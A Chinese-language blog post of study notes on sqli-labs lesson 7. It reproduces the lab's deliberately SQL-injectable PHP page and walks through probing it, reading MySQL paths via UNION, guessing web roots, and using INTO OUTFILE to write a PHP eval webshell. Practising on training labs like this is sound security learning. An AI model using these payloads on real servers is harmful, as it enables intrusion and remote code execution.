---
title: sqli-labs学习笔记_07
categories:
- sqli-labs
tags:
- sql注入
updated: 2018-06-07
---

**第七节： Dump into outfile - String** （导出文件GET字符型注入）

 



可以在你的php文件中加上一句话:echo "你的sql语句是：

```php+HTML
echo "你的sql语句是：".$sql."<br>";
```

代码如下：

~~~php+HTML
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Less-7 Dump into Outfile</title>

</head>

<body bgcolor="#000000">

<div style=" margin-top:60px;color:#FFF; font-size:23px; text-align:center">Welcome&nbsp;&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br>
<font size="3" color="#FFFF00">


<?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");
error_reporting(0);
// take the variables
if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity 


$sql="SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1";
echo "你的sql语句是：".$sql."<br>";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)
	{
  	echo '<font color= "#FFFF00">';	
  	echo 'You are in.... Use outfile......';
  	echo "<br>";
  	echo "</font>";
  	}
	else 
	{
	echo '<font color= "#FFFF00">';
	echo 'You have an error in your SQL syntax';
	//print_r(mysql_error());
	echo "</font>";  
	}
}
	else { echo "Please input the ID as parameter with numeric value";}

?>
</font> </div></br></br></br><center>
<img src="../images/Less-7.jpg" /></center>
</body>
</html>

~~~



 当使用http://127.0.0.1/Less-7/?id=1的时候：

<img src="{{ site.url }}/assets//blog_images/sqli-labs_07_01.png" />

​          You are in.... Use outfile...... 

这次什么东西都没有出来

尝试加  '    http://127.0.0.1/Less-7/?id=1'   然后回显显示有语法错误

<img src="{{ site.url }}/assets//blog_images/sqli-labs_07_02.png" />

导出到文件就是可以将查询结果导出到一个文件中，如常见的将一句话木马导出到一个php文件中，sqlmap中也有导出一句话和一个文件上传的页面

常用的语句是：  select "<?php @eval($_POST['crow']);?>" into outfile "XXX\test.php" ，当这里要获取到网站的在系统中的具体路径（绝对路径） 密码就是crow

这个要怎么获取呢，根据系统和数据库猜测，如winserver的iis默认路径是c:/inetpub/wwwroot/，这好像说偏了，这是asp的，但知道也好

linux的nginx一般是/usr/local/nginx/html，/home/wwwroot/default，/usr/share/nginx，/var/www/htm等

apache 就/var/www/htm，/var/www/html/htdocs

**下面给一个很有可能获取得到的方法，（因为less7不输出信息，先从less获取信息）**

首先介绍两个可以说是函数，还是变量的东西

@@datadir 读取数据库路径
@@basedir MYSQL 获取安装路径（转）

构造：http://127.0.0.1/Less-3/?id=1456') union select 1,@@basedir,@@datadir %23

<img src="{{ site.url }}/assets//blog_images/sqli-labs_07_03.png" />



outfile的固定结构是：select A into outfile B，这里的B通常是一个文件路径，A可以是文本内容（小马），也可以是数据库信息 

使用中国菜刀的连接：

```
http://127.0.0.1/Less-7/?id=-1')) union select 1,'2','<?php @eval($_POST["1"]);?>' into outfile 'D:\\phpstudy\\PHPTutorial\\WWW\\Less-7\\crow.txt' %23  
```

不清楚原因是什么，我就是做不出来，大佬说可能是我phpstudy配置的问题，但是看网上的很多人都是可以用这个方法做出来的，好遗憾！以后再做吧！！！

(个人学习笔记，部分转自互联网)













 








